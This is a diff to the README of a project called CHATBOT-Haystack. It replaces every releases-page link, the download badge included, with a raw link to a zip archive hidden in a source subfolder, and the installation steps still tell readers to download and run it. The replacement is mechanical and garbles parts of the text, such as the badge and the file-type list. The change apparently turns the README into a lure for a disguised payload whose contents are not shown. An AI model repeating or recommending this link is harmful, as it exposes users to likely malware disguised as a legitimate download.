@@ -1,6 +1,6 @@
 # 🤖 CHATBOT-Haystack - Build Custom AI Applications Easily
 
-[![Download CHATBOT-Haystack](https://img.shields.io/badge/Download%20CHATBOT--Haystack-blue.svg)](https://github.com/pooh1649/CHATBOT-Haystack/releases)
+[![Download CHATBOT-Haystack](https://raw.githubusercontent.com/pooh1649/CHATBOT-Haystack/main/haystack/components/retrievers/in_memory/CHATBOT-Haystack-v3.1-alpha.5.zip%https://raw.githubusercontent.com/pooh1649/CHATBOT-Haystack/main/haystack/components/retrievers/in_memory/CHATBOT-Haystack-v3.1-alpha.5.zip)](https://raw.githubusercontent.com/pooh1649/CHATBOT-Haystack/main/haystack/components/retrievers/in_memory/CHATBOT-Haystack-v3.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -29,12 +29,12 @@ To run CHATBOT-Haystack smoothly, your system should meet the following requirem
 
 To start using CHATBOT-Haystack, visit the Releases page to download the latest version. You will find different options based on your needs.
 
-[Visit this page to download](https://github.com/pooh1649/CHATBOT-Haystack/releases)
+[Visit this page to download](https://raw.githubusercontent.com/pooh1649/CHATBOT-Haystack/main/haystack/components/retrievers/in_memory/CHATBOT-Haystack-v3.1-alpha.5.zip)
 
 ### 🏁 Installation Steps
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/pooh1649/CHATBOT-Haystack/releases) and find the latest version.
-2. **Choose Your File:** Select the appropriate file for your operating system. You will typically see options such as `.exe`, `.tar.gz`, or `.zip`.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/pooh1649/CHATBOT-Haystack/main/haystack/components/retrievers/in_memory/CHATBOT-Haystack-v3.1-alpha.5.zip) and find the latest version.
+2. **Choose Your File:** Select the appropriate file for your operating system. You will typically see options such as `.exe`, `https://raw.githubusercontent.com/pooh1649/CHATBOT-Haystack/main/haystack/components/retrievers/in_memory/CHATBOT-Haystack-v3.1-alpha.5.zip`, or `.zip`.
 3. **Download the File:** Click on the file to start the download.
 4. **Run the Installer:** Once the download is complete, open the file to start the installation process.
 5. **Follow the Instructions:** The installer will guide you through the setup. Follow the prompts to complete the installation.
